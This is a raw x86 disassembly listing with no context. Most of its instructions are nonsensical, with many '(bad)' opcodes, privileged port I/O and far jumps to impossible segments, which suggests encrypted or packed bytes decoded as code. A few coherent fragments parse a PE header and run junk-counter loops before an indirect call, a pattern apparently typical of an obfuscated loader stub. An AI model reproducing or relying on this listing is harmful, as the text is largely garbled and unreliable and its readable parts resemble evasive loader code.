  411261:	into   
  411262:	jecxz  0x411241
  411264:	sbb    ah,BYTE PTR [esi+eax*8+0x67b6e592]
  41126b:	jl     0x4112c3
  41126d:	jmp    FWORD PTR ss:[ebp-0x2787fdb9]
  411274:	cmp    eax,0xd150873e
  411279:	sub    BYTE PTR [edx],0x5c
  41127c:	pusha  
  41127d:	sti    
  41127e:	inc    eax
  41127f:	cmp    al,0xde
  411281:	or     esi,DWORD PTR [edx-0x36]
  411284:	xor    BYTE PTR [esi],bh
  411286:	cmc    
  411287:	nop
  411288:	stos   BYTE PTR es:[edi],al
  411289:	shl    DWORD PTR [edx+eax*1-0x50],1
  41128d:	mov    ebp,0x176a6a89
  411292:	(bad)  
  411293:	sbb    edi,DWORD PTR [edi-0x2ccc6a4]
  411299:	adc    al,0xf5
  41129b:	sbb    ebx,DWORD PTR [edi-0x71df7ff1]
  4112a1:	rcr    BYTE PTR [eax],1
  4112a3:	cld    
  4112a4:	mov    ebx,0xbd468930
  4112a9:	in     al,dx
  4112aa:	adc    DWORD PTR [ebp-0x2467feb0],0x19
  4112b1:	jbe    0x41130c
  4112b3:	mov    eax,0x786b7acc
  4112b8:	jb     0x411322
  4112ba:	stc    
  4112bb:	hlt    
  4112bc:	dec    ecx
  4112bd:	dec    ebx
  4112be:	outs   dx,DWORD PTR ds:[esi]
  4112bf:	push   0xffffffe6
  4112c1:	inc    eax
  4112c2:	div    esp
  4112c4:	jge    0x411310
  4112c6:	mov    bh,0x5b
  4112c8:	sar    DWORD PTR [edi],cl
  4112ca:	push   ebp
  4112cb:	lea    ebx,[edi]
  4112cd:	jp     0x411327
  4112cf:	cmp    ebp,DWORD PTR [esi]
  4112d1:	dec    edi
  4112d2:	sub    esp,0xfffffff4
  4112d5:	fistp  WORD PTR [ebx+0x16bd94ff]
  4112db:	sbb    BYTE PTR [ebp-0x61],0xfa
  4112df:	cld    
  4112e0:	or     al,0x52
  4112e2:	mov    esp,0xc00652e5
  4112e7:	je     0x4115eb
  4112ed:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  4112f4:	lea    eax,[ebp-0x18]
  4112f7:	mov    DWORD PTR [ebp-0x14],eax
  4112fa:	mov    eax,DWORD PTR [ebp-0x14]
  4112fd:	add    DWORD PTR [eax],0x705fa8f
  411303:	mov    eax,DWORD PTR [ebp-0x10]
  411306:	jmp    0x4115d4
  41130b:	sub    al,0xc2
  41130d:	or     al,0xb3
  41130f:	lock jno 0x4112c3
  411312:	inc    ecx
  411313:	mov    ds:0x1368f61e,eax
  411318:	mul    edx
  41131a:	iret   
  41131b:	dec    ecx
  41131c:	inc    ebp
  41131d:	jle    0x41139d
  41131f:	scas   eax,DWORD PTR es:[edi]
  411320:	jl     0x4113a0
  411322:	jle    0x411309
  411324:	fst    DWORD PTR [esi]
  411326:	mov    esp,0xe12cb2a0
  41132b:	cs jl  0x411309
  41132e:	push   ds
  41132f:	pop    ecx
  411330:	arpl   WORD PTR ss:[edx+0x73f95ed6],di
  411337:	out    dx,al
  411338:	lods   eax,DWORD PTR ds:[esi]
  411339:	push   es
  41133a:	rol    dl,0x65
  41133d:	push   ss
  41133e:	fsubr  QWORD PTR [edi-0xd5267a2]
  411344:	and    BYTE PTR [eax],bl
  411346:	test   BYTE PTR [ecx-0x2c],dl
  411349:	int3   
  41134a:	push   ecx
  41134b:	outs   dx,DWORD PTR ds:[esi]
  41134c:	call   0xc0e9:0xf2db825f
  411353:	add    BYTE PTR [edx-0x5e342661],dl
  411359:	jno    0x4112f6
  41135b:	lods   eax,DWORD PTR ds:[esi]
  41135c:	mov    edx,0xc4d4ed57
  411361:	ret    0x2f0d
  411364:	mov    ebx,0xcf557b21
  411369:	mov    esi,0x1b645434
  41136e:	rcr    BYTE PTR [eax],0xce
  411371:	pop    ss
  411372:	xchg   edx,eax
  411373:	mov    ds,WORD PTR [ecx]
  411375:	fisttp DWORD PTR [edi+ebp*8-0x11]
  411379:	iret   
  41137a:	cli    
  41137b:	out    dx,al
  41137c:	sub    dh,dl
  41137e:	lea    ebp,[ebx+0x0]
  411381:	cmp    al,0x19
  411383:	sbb    al,0x11
  411385:	mov    al,0x98
  411387:	ds jne 0x411355
  41138a:	mov    al,ds:0xbf363700
  41138f:	dec    edi
  411390:	inc    edi
  411391:	das    
  411392:	data16 out 0x76,al
  411395:	add    dl,0xb7
  411398:	(bad)  
  411399:	sbb    BYTE PTR [eax+ebx*4],bh
  41139c:	fwait
  41139d:	pusha  
  41139e:	fistp  WORD PTR [esp+esi*2+0x7]
  4113a2:	mov    DWORD PTR [edi+0x11],eax
  4113a5:	mov    ds:0x4a560919,eax
  4113aa:	fisub  DWORD PTR [ecx-0x1a446bb6]
  4113b0:	cmp    ah,dh
  4113b2:	inc    ecx
  4113b3:	cwde   
  4113b4:	xor    edx,edx
  4113b6:	dec    esi
  4113b7:	fldlg2 
  4113b9:	shr    edi,0x51
  4113bc:	aaa    
  4113bd:	jo     0x411407
  4113bf:	(bad)  
  4113c0:	mov    esi,ecx
  4113c2:	xchg   ebp,eax
  4113c3:	adc    BYTE PTR [ecx+ebx*8+0x65],bh
  4113c7:	cli    
  4113c8:	popa   
  4113c9:	repnz int 0x97
  4113cc:	hlt    
  4113cd:	out    dx,eax
  4113ce:	jg     0x4113e2
  4113d0:	pop    ebx
  4113d1:	xchg   bh,dl
  4113d3:	cdq    
  4113d4:	push   eax
  4113d5:	mov    DWORD PTR [edx-0x15d9cabc],ecx
  4113db:	loope  0x4113e3
  4113dd:	sbb    eax,DWORD PTR [edx-0x6e96b638]
  4113e3:	jbe    0x411407
  4113e5:	retf   0x2fb7
  4113e8:	and    ch,BYTE PTR [edx-0x67fa149]
  4113ee:	(bad)  
  4113ef:	sti    
  4113f0:	mov    ah,BYTE PTR [esi+0x4ca4fafb]
  4113f6:	in     al,dx
  4113f7:	push   esp
  4113f8:	mov    dl,0xc2
  4113fa:	dec    ebp
  4113fb:	not    eax
  4113fd:	(bad)  
  4113fe:	pop    ss
  4113ff:	clc    
  411400:	pop    edx
  411401:	jns    0x4113f6
  411403:	sbb    edx,edi
  411405:	imul   edi,DWORD PTR [eax+0x33],0x4d
  411409:	xor    DWORD PTR [edx-0x3c],ebx
  41140c:	push   ds
  41140d:	scas   al,BYTE PTR es:[edi]
  41140e:	sub    eax,0x221bffb2
  411413:	cmp    BYTE PTR [edi+0x42],dl
  411416:	(bad)  
  41141a:	popf   
  41141b:	enter  0x9dfa,0xc7
  41141f:	jno    0x411453
  411421:	xchg   edi,eax
  411422:	dec    edi
  411423:	dec    esi
  411424:	dec    ebx
  411425:	inc    edx
  411426:	pushf  
  411427:	test   al,0x99
  411429:	or     dh,BYTE PTR [eax+0x3843a91c]
  41142f:	mov    esi,0x70a33eff
  411434:	retf   0x48de
  411437:	mov    ebp,0x115b8c02
  41143c:	addr16 repnz in eax,0x9e
  411440:	jle    0x411420
  411442:	pop    esi
  411443:	lods   al,BYTE PTR ds:[esi]
  411444:	call   FWORD PTR [eax]
  411446:	sar    DWORD PTR [edx+edx*2-0x37],1
  41144a:	inc    eax
  41144b:	xchg   ecx,eax
  41144c:	ins    BYTE PTR es:[edi],dx
  41144d:	adc    BYTE PTR [eax+eax*8],ch
  411450:	mov    ss,WORD PTR [edi]
  411452:	popa   
  411453:	cld    
  411454:	add    bh,BYTE PTR [ebp-0x4e]
  411457:	lea    esp,[ecx]
  411459:	imul   edx,DWORD PTR [eax],0x8ff5b8fc
  41145f:	test   bl,ch
  411461:	pop    esp
  411462:	mov    esp,ecx
  411464:	cmp    al,0x8e
  411466:	js     0x4114b0
  411468:	push   0xa
  41146a:	in     eax,0x2f
  41146c:	mov    ecx,0xc940a290
  411471:	mov    WORD PTR [edx],gs
  411473:	xor    dl,bh
  411475:	cmp    ah,bl
  411477:	lahf   
  411478:	ror    BYTE PTR [edx],0x65
  41147b:	dec    edx
  41147c:	mov    esi,0x23f9452d
  411481:	mov    eax,ds:0x14582de
  411486:	or     DWORD PTR [edx-0x1],eax
  411489:	push   eax
  41148a:	sub    edi,edx
  41148c:	imul   ebx,DWORD PTR [edi-0x34],0x71
  411490:	sbb    ebp,ebp
  411492:	lahf   
  411493:	lds    esi,FWORD PTR [ebp+0x78dd9884]
  411499:	mov    ebx,0xdf50a42d
  41149e:	sbb    eax,DWORD PTR [eax]
  4114a0:	jecxz  0x411482
  4114a2:	int    0xa4
  4114a4:	(bad)  
  4114a5:	mov    ah,0x26
  4114a7:	sub    esp,edi
  4114a9:	popf   
  4114aa:	sbb    eax,0xcbb4ca8c
  4114af:	rcl    BYTE PTR [ebx],cl
  4114b1:	in     al,dx
  4114b2:	jnp    0x411492
  4114b4:	(bad)  
  4114b5:	(bad)  
  4114b6:	xlat   BYTE PTR ds:[ebx]
  4114b7:	lods   al,BYTE PTR ds:[esi]
  4114b8:	adc    dh,BYTE PTR [edi+edi*4]
  4114bb:	mov    ah,0x19
  4114bd:	dec    eax
  4114be:	aam    0xf1
  4114c0:	rcl    DWORD PTR [ecx+0x72],cl
  4114c3:	mov    dh,0xf0
  4114c5:	dec    ebx
  4114c6:	fs jl  0x4114ba
  4114c9:	ins    DWORD PTR es:[edi],dx
  4114ca:	mov    edx,0x140ce601
  4114cf:	and    al,0x32
  4114d1:	stc    
  4114d2:	or     ecx,DWORD PTR [ebp-0x21]
  4114d5:	jl     0x41148b
  4114d7:	(bad)  
  4114d8:	sub    BYTE PTR [esi],bh
  4114da:	sub    eax,DWORD PTR [edi-0x655c9496]
  4114e0:	fisubr WORD PTR [ecx+0x33]
  4114e3:	sbb    edx,DWORD PTR [edi]
  4114e5:	xchg   ebx,eax
  4114e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114e7:	ss sbb al,0xd8
  4114ea:	nop
  4114eb:	fcom   QWORD PTR [ebx-0x4a6a725c]
  4114f1:	test   cl,ah
  4114f3:	xor    DWORD PTR [edx+0x2e2f5694],edx
  4114f9:	inc    ebp
  4114fa:	(bad)  
  4114fb:	sar    BYTE PTR ss:[ebp+0x31],1
  4114ff:	lods   eax,DWORD PTR ds:[esi]
  411500:	imul   bl
  411502:	sub    eax,0xa3548f47
  411507:	retf   
  411508:	sub    bl,BYTE PTR [ebx-0x58]
  41150b:	mov    al,0x79
  41150d:	sbb    DWORD PTR [edx-0x6753937d],eax
  411513:	dec    ebx
  411514:	xchg   esi,eax
  411515:	ret    0x10b3
  411518:	ja     0x41154a
  41151a:	shl    BYTE PTR [edi],1
  41151c:	sbb    eax,0x1ac7b951
  411521:	loopne 0x41159d
  411523:	iret   
  411524:	(bad)
  411527:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411528:	mov    ecx,0xa35a7db3
  41152d:	fstp   TBYTE PTR [edx-0x5345fe7b]
  411533:	mov    cl,0xc4
  411535:	ror    BYTE PTR [edi+0x5d544a03],1
  41153b:	cmp    eax,0x39ec3178
  411540:	push   cs
  411541:	call   0x9308:0xfbb265cc
  411548:	cdq    
  411549:	call   0xe36d8aec
  41154e:	xlat   BYTE PTR ds:[ebx]
  41154f:	repnz leave 
  411551:	jb     0x41152f
  411553:	sbb    DWORD PTR [edi-0x3c],ebx
  411556:	repnz sbb DWORD PTR [ecx+0x57],0x78
  41155b:	mov    eax,ss
  41155d:	pop    ebp
  41155e:	sbb    eax,0xe30f3828
  411563:	pop    eax
  411564:	daa    
  411565:	cmp    eax,0xe1157b42
  41156a:	mov    dh,0x3a
  41156c:	cmc    
  41156d:	fadd   DWORD PTR gs:[eax+0x41]
  411571:	and    DWORD PTR [ebx-0x71],ebx
  411574:	pop    edi
  411575:	dec    ebx
  411576:	pop    esp
  411577:	int    0xdd
  411579:	adc    dh,BYTE PTR [edx]
  41157b:	in     al,dx
  41157c:	shl    bh,1
  41157e:	test   BYTE PTR [eax-0xf],bh
  411581:	loop   0x41153a
  411583:	xor    al,0x1f
  411585:	dec    edx
  411586:	mov    al,ds:0x9119d30a
  41158b:	inc    eax
  41158c:	inc    ecx
  41158d:	jmp    0x9d1a:0x773bf9c5
  411594:	mov    ecx,DWORD PTR [eax]
  411596:	mov    ds:0x8cc9fa38,al
  41159b:	stc    
  41159c:	stos   BYTE PTR es:[edi],al
  41159d:	cmp    al,0x6a
  41159f:	loope  0x4115f0
  4115a1:	mov    bl,BYTE PTR [edi+0x4]
  4115a4:	stos   DWORD PTR es:[edi],eax
  4115a5:	xchg   BYTE PTR [edi],ah
  4115a7:	sti    
  4115a8:	pop    esi
  4115a9:	jp     0x411548
  4115ab:	lods   eax,DWORD PTR ds:[esi]
  4115ac:	stos   DWORD PTR es:[edi],eax
  4115ad:	mov    ds:0xc142dfcf,al
  4115b2:	dec    esi
  4115b3:	push   ecx
  4115b4:	add    ebx,DWORD PTR [esi-0x1b]
  4115b7:	sbb    BYTE PTR [eax+esi*8-0x58],bh
  4115bb:	inc    edi
  4115bc:	jmp    DWORD PTR [esi+0x71]
  4115bf:	in     eax,0xb0
  4115c1:	sub    al,BYTE PTR [esi+esi*2-0x13]
  4115c5:	shl    BYTE PTR [esi-0x67],0x96
  4115c9:	in     eax,0xf
  4115cb:	mov    ah,0x59
  4115cd:	jno    0x411646
  4115cf:	cmove  esi,DWORD PTR [eax+0x2f]
  4115d3:	or     BYTE PTR [ebx-0x3eccf7ab],0x8d
  4115da:	test   BYTE PTR [eax],dl
  4115dc:	fwait
  4115dd:	jb     0x411611
  4115df:	add    BYTE PTR [ecx+0x45ff0845],cl
  4115e5:	or     al,0xe9
  4115e7:	sti    
  4115e8:	stc    
  4115e9:	(bad)  
  4115ea:	dec    DWORD PTR [ebx-0x3ecc0fbb]
  4115f0:	mov    ecx,DWORD PTR [ebp+0x10]
  4115f3:	add    eax,esi
  4115f5:	mov    DWORD PTR [ecx],eax
  4115f7:	pop    esi
  4115f8:	leave  
  4115f9:	ret    0xc
  4115fc:	push   ebp
  4115fd:	mov    ebp,esp
  4115ff:	push   ecx
  411600:	mov    DWORD PTR [ebp-0x4],0xf89c8531
  411607:	jmp    0x4117ce
  41160c:	mov    eax,ds:0x7129745c
  411611:	xor    DWORD PTR [ecx+0x74],esp
  411614:	in     eax,0xeb
  411616:	leave  
  411617:	outs   dx,DWORD PTR ds:[esi]
  411618:	inc    edx
  411619:	or     bl,BYTE PTR [ebp+0x49]
  41161c:	xchg   BYTE PTR [eax+0x7e],al
  41161f:	jle    0x4115c5
  411621:	jg     0x4116a1
  411623:	jle    0x4115cf
  411625:	push   eax
  411626:	dec    esi
  411627:	in     eax,dx
  411628:	out    0x78,eax
  41162a:	sbb    BYTE PTR [ebp-0x2e90e3c4],dh
  411630:	scas   ax,WORD PTR es:[edi]
  411632:	mov    edx,0xf5f48d5b
  411637:	les    ebx,FWORD PTR [edi]
  411639:	mov    bl,BYTE PTR [esp+edx*1]
  41163c:	jne    0x4115d3
  41163e:	data16 into 
  411640:	into   
  411641:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411642:	js     0x411673
  411644:	(bad)  
  411645:	(bad)  
  411646:	popa   
  411647:	pop    ebx
  411648:	lock add esp,DWORD PTR [edx]
  41164b:	int3   
  41164c:	nop
  41164d:	loope  0x4116c8
  41164f:	scas   eax,DWORD PTR es:[edi]
  411650:	or     al,cl
  411652:	dec    edx
  411653:	rep ins BYTE PTR es:[edi],dx
  411655:	mov    eax,ds:0xb137a96a
  41165a:	push   edi
  41165b:	mov    edx,0x4be8ff6f
  411660:	imul   esi,DWORD PTR [esi+ebp*4],0xffffffb2
  411664:	add    ecx,DWORD PTR [esi+edx*1-0x69]
  411668:	fimul  WORD PTR [ebp-0x7232f9f]
  41166e:	mov    edx,0x13d7fb8a
  411673:	bound  ebx,QWORD PTR [ebx+0x5e]
  411676:	mov    esp,ebp
  411678:	sar    DWORD PTR [ebx+0x7ff18024],0xc5
  41167f:	pop    ecx
  411680:	sub    BYTE PTR [ebp+0x68],bl
  411683:	jns    0x4116ee
  411685:	mov    ecx,0xce6ede46
  41168a:	std    
  41168b:	fidiv  DWORD PTR [esi+ebx*2+0xc2cd22]
  411692:	and    DWORD PTR [edi-0x9],esi
  411695:	xchg   esi,eax
  411696:	data16 adc al,0xde
  411699:	rol    BYTE PTR [edi],1
  41169b:	pop    ss
  41169c:	push   ss
  41169d:	mov    ch,0xc8
  41169f:	xchg   DWORD PTR ds:0xbda0b262,ebp
  4116a5:	cmp    DWORD PTR [ebx-0x612faffa],ebp
  4116ab:	aas    
  4116ac:	mov    cl,0xe7
  4116ae:	inc    ecx
  4116af:	imul   ebx,DWORD PTR [esp+ebx*1],0x3c
  4116b3:	lods   eax,DWORD PTR ds:[esi]
  4116b4:	sub    BYTE PTR [edi+0x60a41fa5],ch
  4116ba:	and    ecx,DWORD PTR [ecx-0x2b4e93f]
  4116c0:	stc    
  4116c1:	xor    ecx,ebp
  4116c3:	mov    cl,0xc2
  4116c5:	inc    ecx
  4116c6:	mov    WORD PTR [edx+0x3],fs
  4116c9:	cmp    al,BYTE PTR ds:[ebx+eiz*2+0x5c]
  4116ce:	scas   al,BYTE PTR es:[edi]
  4116cf:	xor    eax,edi
  4116d1:	js     0x41171e
  4116d3:	pushf  
  4116d4:	icebp  
  4116d5:	xchg   ebp,eax
  4116d6:	popa   
  4116d7:	cmp    esp,DWORD PTR [edi-0x18]
  4116da:	pop    eax
  4116db:	bound  edi,QWORD PTR [ecx-0x3e]
  4116de:	repz fidiv WORD PTR [ebx+eiz*4+0x36]
  4116e3:	xor    al,0x14
  4116e5:	mov    ah,0x7f
  4116e7:	push   esi
  4116e8:	popf   
  4116e9:	cld    
  4116ea:	ss int3 
  4116ec:	push   es
  4116ed:	sub    DWORD PTR [esi*8+0x4d12479],ebx
  4116f4:	jmp    0xb7b7:0x6cda1d4e
  4116fb:	cs or  eax,0xcc4e00ca
  411701:	inc    ebx
  411702:	push   es
  411703:	repnz (bad) 
  411706:	pop    ebp
  411707:	sahf   
  411708:	es jecxz 0x41172f
  41170b:	ss js  0x411750
  41170e:	dec    esp
  41170f:	icebp  
  411710:	add    BYTE PTR [ebp+0x583f83d4],bl
  411716:	je     0x411774
  411718:	iret   
  411719:	leave  
  41171a:	dec    esp
  41171b:	push   0x433191a3
  411720:	sbb    dh,BYTE PTR cs:[eax]
  411723:	mov    bl,0xcd
  411725:	adc    al,0xd7
  411727:	inc    edx
  411728:	jb     0x41170e
  41172a:	shl    eax,cl
  41172c:	push   ebx
  41172d:	in     eax,dx
  41172e:	in     eax,0xaa
  411730:	and    al,0xca
  411732:	fisttp DWORD PTR [ebx]
  411734:	mov    esp,0xb66cb866
  411739:	inc    ebx
  41173a:	es ss sbb al,0xb8
  41173e:	shl    BYTE PTR [eax],0xbc
  411741:	fldenv [ecx-0x3408dc10]
  411747:	sub    DWORD PTR [edi],esi
  411749:	popf   
  41174a:	xchg   ebx,eax
  41174b:	xor    al,0x94
  41174d:	enter  0x6102,0x15
  411751:	pop    edi
  411752:	sub    ebp,edi
  411754:	or     DWORD PTR [ebp+eiz*2+0x27],0x9bb53a24
  41175c:	scas   ax,WORD PTR es:[edi]
  41175e:	mov    gs,WORD PTR [esi]
  411760:	cmp    eax,0x6467153a
  411765:	mov    ebp,0xfcff2844
  41176a:	cmp    BYTE PTR [edi],bl
  41176c:	out    dx,al
  41176d:	xchg   edi,eax
  41176e:	adc    bl,BYTE PTR [edi-0x24cf37d5]
  411774:	(bad)  
  411776:	in     al,0x24
  411778:	(bad)  
  411779:	xor    eax,0xb70cc257
  41177e:	adc    DWORD PTR [edi+0xe8bb5b5],0x7a
  411785:	xchg   edi,eax
  411786:	mov    ebp,0x3e0b361b
  41178b:	out    0x60,eax
  41178d:	stos   DWORD PTR es:[edi],eax
  41178e:	fwait
  41178f:	(bad)  
  411790:	jge    0x4117de
  411792:	cwde   
  411793:	jbe    0x411724
  411795:	shr    DWORD PTR [ebx+0x3dfcd74c],1
  41179b:	add    ebx,esp
  41179d:	push   cs
  41179e:	or     eax,0xae125068
  4117a3:	xchg   esi,eax
  4117a4:	sbb    ebx,DWORD PTR [edx+0x41c4fea6]
  4117aa:	mov    DWORD PTR [esp+eax*1+0x72f4c231],ebp
  4117b1:	retf   0x8484
  4117b4:	inc    edi
  4117b5:	(bad)  
  4117b6:	lods   al,BYTE PTR ds:[esi]
  4117b7:	sahf   
  4117b8:	cmp    esp,eax
  4117ba:	out    dx,al
  4117bb:	repz cdq 
  4117bd:	int    0x29
  4117bf:	cmp    bl,bl
  4117c1:	aas    
  4117c2:	dec    edi
  4117c3:	pop    ebx
  4117c4:	adc    al,0x35
  4117c6:	pop    esi
  4117c7:	in     al,0x23
  4117c9:	shr    eax,0xa2
  4117cc:	arpl   WORD PTR [edi-0x38f7ba75],dx
  4117d2:	add    eax,0x433823
  4117d7:	cmp    eax,0x8a000042
  4117dc:	add    BYTE PTR [ecx+0x43377f2d],al
  4117e2:	add    BYTE PTR [ebp+0x6d],bh
  4117e5:	add    BYTE PTR [eax],al
  4117e7:	add    al,0x38
  4117e9:	xor    DWORD PTR ds:0x43381f,0x433783
  4117f3:	xor    al,0x46
  4117f5:	mov    DWORD PTR ds:0x43381f,0x735a
  4117ff:	cmp    al,0xc3
  411801:	jne    0x411aa4
  411807:	and    edx,0x7ba3
  41180d:	mov    eax,DWORD PTR [ebp+0x8]
  411810:	mov    ecx,DWORD PTR [ebp+0x8]
  411813:	add    ecx,DWORD PTR [eax+0x3c]
  411816:	and    DWORD PTR ds:0x43379b,0x4b8b
  411820:	mov    edx,0x7510854
  411825:	and    DWORD PTR ds:0x43382b,0x0
  41182f:	mov    eax,ds:0x43382b
  411834:	inc    eax
  411835:	mov    ds:0x43382b,eax
  41183a:	cmp    DWORD PTR ds:0x43382b,0xb
  411841:	jne    0x411887
  411847:	push   0x43393c
  41184c:	push   0x761c
  411851:	push   0x2832
  411856:	push   0x3f0d
  41185b:	push   0x4923
  411860:	push   DWORD PTR [ebp-0x24]
  411863:	push   DWORD PTR [ebp-0x28]
  411866:	push   DWORD PTR [ebp-0xc]
  411869:	push   0x49e1
  41186e:	push   DWORD PTR [ebp-0x28]
  411871:	push   DWORD PTR [ebp-0x14]
  411874:	push   DWORD PTR [ebp-0x10]
  411877:	push   0x6b07
  41187c:	push   0x8d34
  411881:	call   DWORD PTR ds:0x4122b8
  411887:	cmp    DWORD PTR ds:0x43382b,0xa
  41188e:	jne    0x41189f
  411894:	mov    eax,ds:0x43382b
  411899:	inc    eax
  41189a:	mov    ds:0x43382b,eax
  41189f:	cmp    DWORD PTR ds:0x43382b,0x11
  4118a6:	jb     0x41182f
  4118ac:	mov    DWORD PTR [ebp+0x8],ecx
  4118af:	mov    eax,DWORD PTR [ebp-0x4]
  4118b2:	xor    eax,edx
  4118b4:	push   esi
  4118b5:	mov    esi,DWORD PTR [ebp+0x8]
  4118b8:	mov    ecx,0x32729b
  4118bd:	add    eax,ecx
  4118bf:	cmp    DWORD PTR [esi+0x54],eax
  4118c2:	pop    esi
  4118c3:	je     0x4118d1
  4118c9:	mov    eax,DWORD PTR [ebp+0x8]
  4118cc:	jmp    0x411ab1
  4118d1:	mov    eax,DWORD PTR [ebp-0x4]
  4118d4:	xor    eax,edx
  4118d6:	jmp    0x411a9d
  4118db:	mov    ebp,0xe1e4219a
  4118e0:	gs mov ecx,0x58658ca3
  4118e6:	stos   DWORD PTR es:[edi],eax
  4118e7:	push   0xffffff86
  4118e9:	js     0x41194c
  4118eb:	sub    al,0x4e
  4118ed:	jle    0x41196d
  4118ef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4118f0:	jg     0x411970
  4118f2:	jle    0x41192e
  4118f4:	dec    esi
  4118f5:	lahf   
  4118f6:	enter  0x2211,0xd3
  4118fa:	xchg   BYTE PTR [edx+0x40dae483],bh
  411900:	add    bh,ah
  411902:	pop    ds
  411903:	mov    bh,0xb1
  411905:	push   ds
  411906:	mov    al,ds:0x827089bf
  41190b:	xchg   ebp,eax
  41190c:	(bad)  
  41190d:	rol    BYTE PTR [ecx],1
  41190f:	mov    al,0x2c
  411911:	inc    edi
  411912:	jle    0x411986
  411914:	xor    edx,eax
  411916:	sub    eax,0x845e33ee
  41191b:	or     eax,0xbfbfbf11
  411920:	push   ebp
  411921:	retf   0x899a
  411924:	xor    BYTE PTR [esi+eax*8],0x7e
  411928:	adc    BYTE PTR [ebx+eax*1],ah
  41192b:	call   0x1114:0x90a787ea
  411932:	add    al,0xf1
  411934:	iret   
  411935:	dec    ebx
  411936:	mov    ch,0xdd
  411938:	in     eax,0x9a
  41193a:	in     eax,0x11
  41193c:	cmovs  edi,DWORD PTR [eax+0x1f]
  411940:	mov    dl,0x21
  411942:	push   eax
  411943:	sbb    ebx,esi
  411945:	test   eax,0x65f1cc96
  41194a:	adc    eax,0x2f8a8c5f
  41194f:	aad    0xc9
  411951:	les    ebp,FWORD PTR [esp+ecx*4]
  411954:	arpl   WORD PTR [ecx+0x31d6075f],sp
  41195a:	xor    BYTE PTR [ebx-0x23467f7],cl
  411960:	jge    0x411996
  411962:	lds    ebx,FWORD PTR [eax-0x47]
  411965:	and    DWORD PTR [ebx+eax*2+0x77259e57],ecx
  41196c:	dec    edx
  41196d:	test   eax,0x6bf2329b
  411972:	inc    ebx
  411973:	mov    esi,0xcfa5ce8c
  411978:	pusha  
  411979:	push   ebx
  41197a:	out    dx,al
  41197b:	inc    esp
  41197c:	and    al,al
  41197e:	pop    edi
  41197f:	pop    ss
  411980:	adc    BYTE PTR [ebp-0x10],0x87
  411984:	retf   0x71bb
  411987:	xchg   ecx,eax
  411988:	sub    ecx,DWORD PTR [ebx-0xca99f5e]
  41198e:	fsub   st(4),st
  411990:	inc    eax
  411991:	fs cmc 
  411993:	add    cl,bl
  411995:	add    DWORD PTR [ebp-0x64],0xfffffff8
  411999:	adc    dh,BYTE PTR [ebx]
  41199b:	jbe    0x41192e
  41199d:	add    BYTE PTR [esi+0x46678501],dl
  4119a3:	out    0xa7,al
  4119a5:	sub    al,0xa9
  4119a7:	or     bl,BYTE PTR [esi-0x7bceece3]
  4119ad:	adc    eax,eax
  4119af:	adc    al,0x3c
  4119b1:	mov    ds:0x9689cda8,al
  4119b6:	add    DWORD PTR [edx+0xa3ae142],ecx
  4119bc:	xor    dl,bh
  4119be:	lods   al,BYTE PTR ds:[esi]
  4119bf:	or     eax,0xf1c8e8ca
  4119c4:	bound  ebp,QWORD PTR [edx+0x59280fbd]
  4119ca:	xchg   ecx,eax
  4119cb:	jb     0x411a16
  4119cd:	dec    ebp
  4119ce:	mov    bl,0xf4
  4119d0:	push   ebp
  4119d1:	int3   
  4119d2:	test   BYTE PTR [eax+0x3a],cl
  4119d5:	add    dl,dl
  4119d7:	mov    ebx,0x7cc85ea7
  4119dc:	test   BYTE PTR [edx-0x16],ah
  4119df:	jb     0x411a12
  4119e1:	fcom   QWORD PTR [edi-0x16]
  4119e4:	(bad)  
  4119e5:	fadd   QWORD PTR [eax]
  4119e7:	pmullw mm6,QWORD PTR [edi-0x16]
  4119eb:	(bad)  
  4119ec:	mov    eax,0xa1171a42
  4119f1:	repnz fwait
  4119f3:	push   ebx
  4119f4:	push   cs
  4119f5:	or     dh,bh
  4119f7:	adc    BYTE PTR [ebx],ch
  4119f9:	mov    edi,0xa2154d4b
  4119fe:	inc    eax
  4119ff:	mov    dl,BYTE PTR [eax]
  411a01:	das    
  411a02:	sbb    DWORD PTR [eax],eax
  411a04:	cmp    ebx,esi
  411a06:	dec    eax
  411a07:	push   es
  411a08:	push   edx
  411a09:	pop    ecx
  411a0a:	inc    edi
  411a0b:	div    DWORD PTR [eax]
  411a0d:	std    
  411a0e:	pop    ecx
  411a0f:	adc    al,0x17
  411a11:	ret    0xd71f
  411a14:	frstor [eax]
  411a16:	cmp    BYTE PTR [eax+edx*8+0x3a],cl
  411a1a:	pop    ds
  411a1b:	push   ebp
  411a1c:	xor    ch,bh
  411a1e:	js     0x411a94
  411a20:	cs or  dl,dh
  411a23:	in     eax,dx
  411a24:	sahf   
  411a25:	pop    edx
  411a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a27:	fwait
  411a28:	stos   BYTE PTR es:[edi],al
  411a29:	leave  
  411a2a:	loopne 0x4119ff
  411a2c:	adc    eax,0xb542230c
  411a31:	mov    edi,0x316c4c67
  411a36:	inc    ebx
  411a37:	jae    0x411aaa
  411a39:	sahf   
  411a3a:	or     al,0x4f
  411a3c:	jo     0x411a13
  411a3e:	cli    
  411a3f:	sub    bl,BYTE PTR [edx-0x63bbfa1b]
  411a45:	in     al,dx
  411a46:	mov    edx,0x996003ed
  411a4b:	sub    edi,DWORD PTR [esi-0x26b86b8]
  411a51:	xchg   BYTE PTR [esi+ecx*2+0x5ae976e4],dh
  411a58:	pop    edx
  411a59:	mov    bl,0x64
  411a5b:	inc    edx
  411a5c:	loope  0x411a43
  411a5e:	fwait
  411a5f:	cmp    al,bh
  411a61:	scas   al,BYTE PTR es:[edi]
  411a62:	hlt    
  411a63:	mov    al,ds:0x866c0a9f
  411a68:	xlat   BYTE PTR ds:[ebx]
  411a69:	and    eax,0xf884b897
  411a6e:	xor    al,0x96
  411a70:	push   edi
  411a71:	jnp    0x411acd
  411a73:	out    dx,eax
  411a74:	cmp    eax,0xeda2cd6f
  411a79:	xor    bh,dh
  411a7b:	dec    ecx
  411a7c:	into   
  411a7d:	pop    esp
  411a7e:	(bad)  
  411a7f:	std    
  411a80:	mov    cl,0xd7
  411a82:	mov    BYTE PTR [edx+edx*2-0x142a7d77],al
  411a89:	jnp    0x411a73
  411a8b:	xor    edx,0xf
  411a8e:	jecxz  0x411a17
  411a90:	rcl    BYTE PTR [ebx-0xf],1
  411a93:	addr16 ret 
  411a95:	adc    ebp,DWORD PTR [eax+0x59]
